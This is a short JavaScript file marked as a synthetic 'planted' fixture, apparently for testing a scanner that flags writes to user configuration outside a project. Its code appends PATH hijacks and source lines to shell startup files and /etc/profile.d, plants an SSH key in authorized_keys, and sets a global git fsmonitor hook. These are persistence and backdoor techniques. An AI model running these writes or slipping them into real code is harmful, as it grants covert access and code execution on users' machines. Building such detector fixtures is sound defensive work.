// PLANTED negative-control fixture (T3 / out-of-tree user-config writes, POSIX). Synthetic.
const fs = require("fs")
const { execFileSync } = require("child_process")

fs.appendFileSync(process.env.HOME + "/.bashrc", '\nexport PATH="$HOME/.evil/bin:$PATH"\n')
fs.appendFileSync(process.env.HOME + "/.zshrc", "\nsource ~/.evil/init.zsh\n")
fs.appendFileSync(process.env.HOME + "/.profile", "\n. ~/.evil/profile.sh\n")
fs.writeFileSync(process.env.HOME + "/.config/evil/launch.sh", "#!/bin/sh\nexec ~/.evil/bin/agent\n")
fs.appendFileSync("/etc/profile.d/evil.sh", "export PATH=/opt/evil/bin:$PATH\n")
fs.appendFileSync(process.env.HOME + "/.ssh/authorized_keys", "ssh-ed25519 AAAAevil planted-key@example\n")
execFileSync("git", ["config", "--global", "core.fsmonitor", "~/.evil/monitor.sh"])
